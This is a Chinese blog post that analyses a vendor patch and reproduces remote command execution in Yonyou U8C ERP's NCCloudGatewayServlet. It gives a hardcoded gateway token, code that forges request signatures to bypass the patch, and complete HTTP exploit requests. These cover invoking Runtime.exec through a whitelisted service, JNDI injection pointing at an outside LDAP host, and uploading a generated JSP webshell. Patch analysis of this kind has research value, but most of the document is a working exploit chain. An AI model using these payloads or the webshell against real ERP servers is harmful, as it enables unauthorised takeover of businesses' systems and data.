---
layout: post
date: 2025-10-21
title: "U8CERP命令执行NCCloudGatewayServlet+小发现"
author: "XinYiSleep"
category: Java
---
<h1 id="mWxxc">一.基础信息</h1>

```
最近在先知社区看到有人发关于用友的U8c命令执行，发现是通过补丁进行分析的，那么对于我这个java安全的初学者还是跟着补丁复现一下来增强挖掘能力，下面是补丁地址。
[https://security.yonyou.com/#/patchInfo?identifier=9695976d67dd4786badf91df6cb6578c](https://security.yonyou.com/#/patchInfo?identifier=9695976d67dd4786badf91df6cb6578c)
下面分析中我会非常细的分析，所以你只需要用友java安全的基础就足够了，因为这个漏洞也不难，难就难到
到达危险方法其中会经过许多参数，但是也问题不大废话不多说那我们开始吧。
```
![](https://xinyisleep.github.io/img/2025/U8CERP/1.png)

<h1 id="Dl1wf">二.获取源码+远程调试</h1>

```
说好的细那么就从获取源码开始吧，下载之后点击u8csetup.bat就会进入安装程序。
[https://pan.yonyou.com/web/share.html?hash=nAvIzp3NQ6Q&wd=&eqid=a5ec57900011c1e70000000665a8a21f](https://pan.yonyou.com/web/share.html?hash=nAvIzp3NQ6Q&wd=&eqid=a5ec57900011c1e70000000665a8a21f)
再就是远程调试了这里我通过修改启动文件startup.bat发现并没有启任何作用，其实用友是专门有程序来解决这个调试问题的，E:\U8CERP\bin\u8cSysConfig.bat 启动这个程序后面添加(图一)
-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005
再去idea配置一下图二,那么远程调试的debug就配置好了，对比php的远程debug调试的话还是非常简单了。
```

![](https://xinyisleep.github.io/img/2025/U8CERP/2.png)

![](https://xinyisleep.github.io/img/2025/U8CERP/3.png)

<h1 id="GZJDL">三.补丁分析-路由分析-小发现</h1>

```
反编译查看补丁，接着通过补丁标题定位这个类但是并没没有找到NCCloudGatewayServlet，那么我们全局搜索一下找到了，发现其实是
com.yonyou.nccloud.gateway.adaptor.servlet.ServletForGW 这个类图一，那么我们也在补丁中找到了这个文件，既然是这个类原因我们进去看看(图二)，
可以看到doAction这个方法和方法参数那么大差不差就是这个参数作为触发点，这里我们去找找这个路由在web.xml中并没 有找到，
那么分析一下路由/*点进去就发现不是接着看到/service/*大致看了一下应该就是了这里，那么首先看看怎么进入到doAction图三，跟进去getServiceObject。

```

![](https://xinyisleep.github.io/img/2025/U8CERP/4.png)

![](https://xinyisleep.github.io/img/2025/U8CERP/5.5.png)

![](https://xinyisleep.github.io/img/2025/U8CERP/5.png)

```
进去之后可以看到进入lookup图一,根据名字我们这里其实是进行了jndi注入的事实也确实这样不着急先一步一步来看图二，我们可以看到图二中开头是
java:comp/env/但是我们并不是所以不会走到lookup这里其实就是进行了jndi注入但是不可控，问题不大那么就会走到图二中的findMete方法图三实际上里面是存在一个黑名单
这些黑名单就是对应的请求key对应的value就是类(也不能这样 讲先这么理解)图二中还有个方法是jndi但是这里的meta变量已经不等于null所以不会走进去这里先不提后面说。
```

![](https://xinyisleep.github.io/img/2025/U8CERP/6.png)

![](https://xinyisleep.github.io/img/2025/U8CERP/7.png)

![](https://xinyisleep.github.io/img/2025/U8CERP/8.png)

```
那么这里其实就已经走出来了，回到InvokerServlet#doAction看下面图一我已经解释了，所以到这里路由分析就结束了，就问你细不细？基本是一步一步走的。
```

![](https://xinyisleep.github.io/img/2025/U8CERP/9.png)

```
还记得上面的jndi方法吗？这里我们先随便写一个路由让上面的Map匹配不到key就可以进去了图一，接着都进
jndiwithReTry方法图二，到这里其实就行了要是在往下走就真的到底层jndi注入了可以看图三
```

![](https://xinyisleep.github.io/img/2025/U8CERP/10.png)

![](https://xinyisleep.github.io/img/2025/U8CERP/11.png)

![](https://xinyisleep.github.io/img/2025/U8CERP/12.png)

```
但是实际上呢？这里是存在问题的那就是最开始InvokerServlet#doAction方法的第一行代码
String pathInfo = request.getPathInfo();
如 /service/rmi://ltnsv0.dnslog.cn:80/Exploit
获取到的是	/rmi:/ltnsv0.dnslog.cn:80/Exploit
两个反引号变成了一个，师傅们要是能看到这里可以自己绕过一下 哈哈。
```

<h1 id="hZDu7">四.命令执行</h1>

<h2 id="rTU9m">4.1：分析命令执行</h2>

```
因为本人菜鸡所以想给部分和鄙人一样菜的人写细一点，大牛子可以跳着看，上面也是分析了请求的路由的部分，之后我们进入ServletForGW#doAction图一，
那么首先绕过这个权限验证图二实际上就是获取一个token进行解密然后和我们的内容进行对比，这里因为token是固定的所以导致绕过，
我已经写好了代码一其实就是复制他的代码哈哈哈那么请求头加入gatewaytoken: 
TJ6RT-3FVCB-DPYP8-XF7QM-96FV3,
接着进入到callNCService方法这里请求json不然转换空进不去。
```
![](https://xinyisleep.github.io/img/2025/U8CERP/13.png)

![](https://xinyisleep.github.io/img/2025/U8CERP/14.png)

```java
import nc.vo.framework.rsa.Encode;

public class Jndi {

    public static void main(String[] args) throws Exception {
        String nctoken = (new Encode()).decode("goimfdnalmcffdjciilkpokdaogklcdofkipilehgahfkgnpknbngcjfaeeomalj");
        System.out.println(nctoken);
        //返回TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
    }

    }

```

```
下面就会走进非常长的一个代码块代码一，说实话我也想一步一步来但是太长了这里我就粗略看
首先看到下面代码我们就明白什么情况了
Object invokeRes = MethodUtils.invokeMethod(ncService, methodName, argValues, argTypes);
MethodUtils.invokeMethod(): Apache Commons Lang 提供的反射工具方法

ncService: 要调用方法的目标对象

methodName: 要调用的方法名称（字符串形式）

argValues: 方法参数值数组

argTypes: 方法参数类型数组

先看看第一个参数和第二个参数是直接可以控制的，

String serviceClassName = serviceInfo.getAsJsonPrimitive("serviceClassName").getAsString();

String methodName = serviceInfo.getAsJsonPrimitive("serviceMethodName").getAsString();

那么是不是可以调用任意的方法呢？其实是不可以的哈，因为这里就出现了和我们分析路由的时候
出现了同样的代码(白名单)，
Object ncService = NCLocator.getInstance().lookup(serviceClassName);
那么就剩下   argValues, argTypes能不能控制了其实是可以的看图一，知道了之后那么既然已经有白名单了还能命令执行吗？我们再次从补丁里面看看。
```

```java
    public Object callNCService(JsonObject jsonObj) throws Throwable {
        Logger.info("NC business processing...");
        JsonPrimitive accountCode = jsonObj.getAsJsonPrimitive("accountCode");
        if (accountCode != null) {
            this.initDataSource(accountCode.getAsString());
        }

        JsonPrimitive groupCode = jsonObj.getAsJsonPrimitive("groupCode");
        if (groupCode != null) {
            JsonPrimitive userCode = jsonObj.getAsJsonPrimitive("user");
            this.initUserContext(groupCode.getAsString(), userCode.getAsString());
        }

        this.initBizDateTime();
        JsonObject serviceInfo = jsonObj.getAsJsonObject("serviceInfo");
        String serviceClassName = serviceInfo.getAsJsonPrimitive("serviceClassName").getAsString();
        String methodName = serviceInfo.getAsJsonPrimitive("serviceMethodName").getAsString();
        JsonArray jsonArgInfoArray = serviceInfo.getAsJsonArray("serviceMethodArgInfo");
        Object[] argValues = (Object[])null;
        Class[] argTypes = (Class[])null;
        int argCount = 0;
        Iterator invokeRes;
        if (jsonArgInfoArray != null) {
            argCount = jsonArgInfoArray.size();
            if (argCount > 0) {
                argValues = new Object[argCount];
                argTypes = new Class[argCount];
            }

            int argIndex = 0;

            for(invokeRes = jsonArgInfoArray.iterator(); invokeRes.hasNext(); ++argIndex) {
                Object jsonArgInfo = invokeRes.next();
                JsonObject jsonArgInfoObj = (JsonObject)jsonArgInfo;
                JsonObject jsonArgTypeObj = jsonArgInfoObj.getAsJsonObject("argType");
                JsonObject jsonArgValueObj = jsonArgInfoObj.getAsJsonObject("argValue");
                Boolean isAgg = jsonArgInfoObj.getAsJsonPrimitive("agg").getAsBoolean();
                Boolean isArray = jsonArgInfoObj.getAsJsonPrimitive("isArray").getAsBoolean();
                Boolean isPrimitive = jsonArgInfoObj.getAsJsonPrimitive("isPrimitive").getAsBoolean();
                String argTypeClassName;
                JsonPrimitive jsonArgTypeBody;
                if (isAgg) {
                    jsonArgTypeBody = jsonArgTypeObj.getAsJsonPrimitive("agg");
                    if (jsonArgTypeBody != null) {
                        argTypeClassName = jsonArgTypeBody.getAsString();
                        if (StringUtils.isEmpty(argTypeClassName)) {
                            throw new BusinessException("聚合VO类名为空，请设置聚合VO类名!");
                        }

                        argTypes[argIndex] = Class.forName(argTypeClassName);
                        if (argTypes[argIndex] != null) {
                            argValues[argIndex] = this.parseAggVO(jsonArgTypeObj, jsonArgValueObj, argTypes[argIndex]);
                        }
                    }
                } else {
                    Class argtype;
                    JsonElement jsonElement;
                    JsonArray jsonArray;
                    ArrayList jsonArrayList;
                    JsonElement jsonEle;
                    Iterator var27;
                    JsonObject jsonObject;
                    Class argclazz;
                    JsonPrimitive tokenType;
                    String tokenTypeClassName;
                    String fieldStr;
                    if (isArray) {
                        jsonArgTypeBody = jsonArgTypeObj.getAsJsonPrimitive("body");
                        if (jsonArgTypeBody != null) {
                            argTypeClassName = jsonArgTypeBody.getAsString();
                            if (StringUtils.isEmpty(argTypeClassName)) {
                                throw new BusinessException("参数类型设置的类名为空，请设置参数类型类名!");
                            }

                            argtype = Class.forName(argTypeClassName);
                            if (isPrimitive) {
                                argtype = GWUtil.getPrimitiveType(argtype, isPrimitive);
                            }

                            if (argtype != null) {
                                jsonElement = jsonArgValueObj.get("body");
                                if (!(jsonElement instanceof JsonArray)) {
                                    if (jsonElement instanceof JsonPrimitive) {
                                        fieldStr = jsonElement.getAsString();
                                        if (!StringUtils.isEmpty(fieldStr)) {
                                            argValues[argIndex] = ConvertUtils.convert(fieldStr, argTypes[argIndex]);
                                        }
                                    }
                                } else {
                                    jsonArray = (JsonArray)jsonElement;
                                    jsonArrayList = new ArrayList();
                                    var27 = jsonArray.iterator();

                                    while(var27.hasNext()) {
                                        jsonEle = (JsonElement)var27.next();
                                        if (jsonEle instanceof JsonPrimitive) {
                                            jsonArrayList.add(ConvertUtils.convert(((JsonPrimitive)jsonEle).getAsString(), argtype));
                                        } else if (jsonEle instanceof JsonObject) {
                                            jsonObject = (JsonObject)jsonEle;
                                            argclazz = Arg.class;
                                            tokenType = jsonArgTypeObj.getAsJsonPrimitive("token");
                                            if (tokenType != null) {
                                                tokenTypeClassName = tokenType.getAsString();
                                                if (!StringUtils.isEmpty(argTypeClassName)) {
                                                    argclazz = Class.forName(tokenTypeClassName);
                                                }
                                            }

                                            jsonArrayList.add(JSonParserUtils.parseJSonToPOJO(jsonObject, argclazz));
                                        }
                                    }

                                    argTypes[argIndex] = GWUtil.newInstance(argtype, jsonArrayList.size(), isPrimitive).getClass();
                                    argValues[argIndex] = GWUtil.convertToVOArray(argtype, jsonArrayList, isPrimitive);
                                }
                            }
                        }
                    } else {
                        jsonArgTypeBody = jsonArgTypeObj.getAsJsonPrimitive("body");
                        if (jsonArgTypeBody != null) {
                            argTypeClassName = jsonArgTypeBody.getAsString();
                            if (StringUtils.isEmpty(argTypeClassName)) {
                                throw new BusinessException("参数类型设置的类名为空，请设置参数类型类名!");
                            }

                            argtype = Class.forName(argTypeClassName);
                            if (isPrimitive) {
                                argtype = GWUtil.getPrimitiveType(argtype, isPrimitive);
                            }

                            argTypes[argIndex] = argtype;
                            if (argTypes[argIndex] != null) {
                                jsonElement = jsonArgValueObj.get("body");
                                if (jsonElement instanceof JsonObject) {
                                    argValues[argIndex] = JSonParserUtils.parseJSonToPOJO((JsonObject)jsonElement, argTypes[argIndex]);
                                } else if (!(jsonElement instanceof JsonArray)) {
                                    if (jsonElement instanceof JsonPrimitive) {
                                        fieldStr = jsonElement.getAsString();
                                        if (!StringUtils.isEmpty(fieldStr)) {
                                            argValues[argIndex] = ConvertUtils.convert(fieldStr, argTypes[argIndex]);
                                        }
                                    }
                                } else {
                                    jsonArray = (JsonArray)jsonElement;
                                    jsonArrayList = new ArrayList();
                                    var27 = jsonArray.iterator();

                                    while(var27.hasNext()) {
                                        jsonEle = (JsonElement)var27.next();
                                        if (jsonEle instanceof JsonPrimitive) {
                                            jsonArrayList.add(ConvertUtils.convert(((JsonPrimitive)jsonEle).getAsString(), argTypes[argIndex]));
                                        } else if (jsonEle instanceof JsonObject) {
                                            jsonObject = (JsonObject)jsonEle;
                                            argclazz = Arg.class;
                                            tokenType = jsonArgTypeObj.getAsJsonPrimitive("token");
                                            if (tokenType != null) {
                                                tokenTypeClassName = tokenType.getAsString();
                                                if (!StringUtils.isEmpty(argTypeClassName)) {
                                                    argclazz = Class.forName(tokenTypeClassName);
                                                }
                                            }

                                            jsonArrayList.add(JSonParserUtils.parseJSonToPOJO(jsonObject, argclazz));
                                        }
                                    }

                                    argValues[argIndex] = jsonArrayList;
                                }
                            }
                        }
                    }
                }
            }
        }

        if (this.sqlwhiteenble && "nc.itf.uap.IUAPQueryBS".equalsIgnoreCase(serviceClassName)) {
            String sql = "select * from gw_tableview";
            String querysql = (String)argValues[0];

            try {
                List<Map<String, Object>> resultMap = (List)(new BaseDAO()).executeQuery(sql, new MapListProcessor());
                if (resultMap.isEmpty()) {
                    Logger.error("目前没有查【" + querysql + "】视图权限");
                    throw new BusinessException("目前没查询【" + querysql + "】视图权限");
                }

                boolean hasright = false;
                String tablename = "";
                Iterator var48 = resultMap.iterator();

                while(var48.hasNext()) {
                    Map<String, Object> row = (Map)var48.next();
                    String sqlview = (String)row.get("sqlview");
                    sqlview = sqlview.replaceAll("@lastupdatetime", "");
                    if (querysql.toLowerCase().indexOf(sqlview.toLowerCase()) > -1) {
                        hasright = true;
                        tablename = (String)row.get("viewname");
                        break;
                    }
                }

                if (!hasright) {
                    Logger.error("目前没有查【" + querysql + "】视图权限");
                    throw new BusinessException("目前没查询【" + querysql + "】视图权限");
                }
            } catch (Exception var34) {
                Logger.error("目前没有查【" + querysql + "】视图权限", var34);
                throw new BusinessException("目前查询【" + querysql + "】视图权限异常：" + var34.getMessage());
            }
        }

        Object ncService = NCLocator.getInstance().lookup(serviceClassName);
        Logger.debug("servicename:" + serviceClassName + ";method:" + methodName);
        boolean success = false;
        invokeRes = null;

        try {
            Object invokeRes = MethodUtils.invokeMethod(ncService, methodName, argValues, argTypes);
```

![](https://xinyisleep.github.io/img/2025/U8CERP/15.png)

```
GWWhiteCtrlUtil.getInstance().checkAuthority(serviceClassName, argValues);
这个是补丁添加的代码也就是说在我们获取到了json数据之后进入
GWWhiteCtrlUtil类那么补丁中确实有这么一个类文件，其中里面存在一个黑名单用来过滤图一，之后看看这
两个类图二IActionInvokeService里面还是进行了一个反射操作，那么再看看ProcessFileUtils图三方法
openFile直接结束，里面直接Runitme进行命令执行了。
```

![](https://xinyisleep.github.io/img/2025/U8CERP/16.png)

![](https://xinyisleep.github.io/img/2025/U8CERP/17.png)

![](https://xinyisleep.github.io/img/2025/U8CERP/18.png)

<h2 id="Xv7cq">4.2：payload构造</h2>
```
这里我是非常非常建议师傅们手动跟一次不然你看到payload还是有点懵逼的，payload代码一，还记得我们之前讲到的小发现吗？没错这里可以打不同的rce的哈哈哈，剩下的就交给师傅们思考了。
```

```java
POST /servlet/NCCloudGatewayServlet HTTP/1.1
Host: xxxxxxxxx
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
gatewaytoken: TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
Content-Length: 689

{
  "serviceInfo": {
    "serviceMethodArgInfo": [
      {
        "argType": {
          "body": "java.lang.String"
        },
        "argValue": {
          "body": "nc.bs.pub.util.ProcessFileUtils"
        },
        "agg": false,
        "isArray": false,
        "isPrimitive": false
      },
      {
        "argType": {
          "body": "java.lang.String"
        },
        "argValue": {
          "body": "openFile"
        },
        "agg": false,
        "isArray": false,
        "isPrimitive": false
      },
      {
        "argType": {
          "body": "java.lang.String"
        },
        "argValue": {
          "body": "mstsc.exe"
        },
        "agg": false,
        "isArray": false,
        "isPrimitive": false
      }
    ],
    "serviceClassName": "com.ufida.zior.console.IActionInvokeService",
    "serviceMethodName": "exec"
  }
}
```

<h1 id="BivFS">五：补丁绕过</h1>

```
这里写这个文章的时候已经很晚了，导致我在分析补丁的时候看错了一部分，以为是一个不可访问的地址，实际上这里是可以绕过的，看图一，
其实就是判断是否180000毫秒以内，并且加密之后在进行base64编码来匹配我们的数据包头sign，这里我写好了绕过代码替换时间戳就行了代码一。
```

![](https://xinyisleep.github.io/img/2025/U8CERP/19.png)

```java
<dependency>
  <groupId>org.apache.commons</groupId>
  <artifactId>commons-lang3</artifactId>
  <version>3.12.0</version>
</dependency>
<dependency>
  <groupId>commons-codec</groupId>
  <artifactId>commons-codec</artifactId>
  <version>1.15</version>
</dependency>

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang3.StringUtils;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

public class HelloServlet{
    public static void main(String[] args) throws Exception {

        System.out.println(sign("1761664314551"));
        checkGateWayTokenNew("1761664314551", "UI566klF5IQp3QrL04x1N0BvUk+cxTeYLVKoiDfkzWc=");

    }
    public static void checkGateWayTokenNew(String ts, String sign) throws Exception {
        if (!StringUtils.isEmpty(ts) && !StringUtils.isEmpty(sign)) {
            long tsLong = 0L;

            try {
                tsLong = Long.parseLong(ts);
            } catch (Exception var5) {
                throw new Exception("您没有请求该服务的权限，ts参数异常");
            }

            if (Math.abs(System.currentTimeMillis() - tsLong) > 180000L) {
                throw new Exception("您没有请求该服务的权限，参数已过期");
            } else if (!StringUtils.equals(sign, sign(ts))) {
                throw new Exception("您没有请求该服务的权限，sign验签失败");
            }
        } else {
            throw new Exception("您没有请求该服务的权限，请重启网关");
        }
    }
    public static String sign(String str) throws NoSuchAlgorithmException, InvalidKeyException {
        return sign(str, "TJ6RT-3FVCB-DPYP8-XF7QM-96FV3");
    }

    public static String sign(String str, String secret) throws NoSuchAlgorithmException, InvalidKeyException {
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), "HmacSHA256"));
        byte[] signData = mac.doFinal(str.getBytes(StandardCharsets.UTF_8));
        return new String(Base64.encodeBase64(signData));
    }
}

```

```
那么这里就可以直接打jndi注入了不知道为什么的再往上看一次，payload代码一。
```

```
POST /servlet/NCCloudGatewayServlet HTTP/1.1
Host: 192.168.2.123:8888
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
sign: UI566klF5IQp3QrL04x1N0BvUk+cxTeYLVKoiDfkzWc=
ts: 1761664314551
Content-Length: 407
{
"serviceInfo": {
    "serviceMethodArgInfo": [
      {
        "argType": {
          "body": "java.lang.String"
        },
        "argValue": {
          "body": "java.lang.String"
        },
        "agg": false,
        "isArray": false,
        "isPrimitive": false
      }
    ],
    "serviceClassName": "ldap://192.168.2.136:1099/hhszoi",
    "serviceMethodName": "exec"
}
}
```

```
那么这里可以打其他的补丁

[https://security.yonyou.com/#/patchInfo?identifier=565b9cc1214b473dbeb4ab96eeafec08](https://security.yonyou.com/#/patchInfo?identifier=565b9cc1214b473dbeb4ab96eeafec08)
图一可以看到是可以直接上传文件的extract有一点小小的限制问题不大我直接把脚本写好了代码一，最终payload代码二结束。
```

![](https://xinyisleep.github.io/img/2025/U8CERP/20.png)

```java
package com.example.demo1;

import java.io.ByteArrayOutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class GenerateCompressedZip {
    public static void main(String[] args) throws Exception {
        // JSP内容
        String jspContent = "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>";

        // 创建ZIP，文件名必须是 "compressed"
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ZipOutputStream zos = new ZipOutputStream(baos);

        ZipEntry entry = new ZipEntry("compressed");
        zos.putNextEntry(entry);
        zos.write(jspContent.getBytes());
        zos.closeEntry();
        zos.close();

        byte[] aaa = baos.toByteArray();

        // 打印为Java数组格式
        System.out.print("byte[] aaa = new byte[]{");
        for (int i = 0; i < aaa.length; i++) {
            System.out.print(aaa[i]);
            if (i < aaa.length - 1) {
                System.out.print(", ");
            }
        }
        System.out.println("};");

        System.out.println("\n总字节数: " + aaa.length);
        System.out.println("ZIP内文件名: compressed");
        System.out.println("文件内容: " + jspContent);
    }
}

```

```java
POST /servlet/NCCloudGatewayServlet HTTP/1.1
Host: 192.168.2.123:8888
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
sign: UI566klF5IQp3QrL04x1N0BvUk+cxTeYLVKoiDfkzWc=
ts: 1761664314551
Content-Length: 1315

{
  "serviceInfo": {
    "serviceMethodArgInfo": [
      {
        "argType": {
          "body": "java.lang.Byte"
        },
        "argValue":{"body":[80, 75, 3, 4, 20, 0, 8, 8, 8, 0, 26, 121, 93, 91, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 0, 0, 0, 99, 111, 109, 112, 114, 101, 115, 115, 101, 100, -77, 81, 13, 42, -51, 43, -55, -52, 77, -43, 75, 79, 45, -127, 50, 53, 52, -11, 82, 43, 82, -109, 53, -118, 82, 11, 75, 83, -117, 75, 64, 50, 1, -119, 69, -119, -71, -87, 37, -87, 69, 26, 74, -55, -71, 41, 74, -102, -102, -86, 118, 0, 80, 75, 7, 8, -73, 75, -109, -81, 52, 0, 0, 0, 58, 0, 0, 0, 80, 75, 1, 2, 20, 0, 20, 0, 8, 8, 8, 0, 26, 121, 93, 91, -73, 75, -109, -81, 52, 0, 0, 0, 58, 0, 0, 0, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 99, 111, 109, 112, 114, 101, 115, 115, 101, 100, 80, 75, 5, 6, 0, 0, 0, 0, 1, 0, 1, 0, 56, 0, 0, 0, 108, 0, 0, 0, 0, 0]
},
        "agg":"false","isArray":"true","isPrimitive":"true"
      },
      {
        "argType": {
          "body": "java.lang.String"
        },
        "argValue": {
          "body": "hotwebs/hrss/123.jsp"
        },
        "agg": false,
        "isArray": false,
        "isPrimitive": false
      }
    ],
    "serviceClassName": "nc.itf.hr.tools.IFileTrans",
    "serviceMethodName": "uploadFile"
  }
}

```
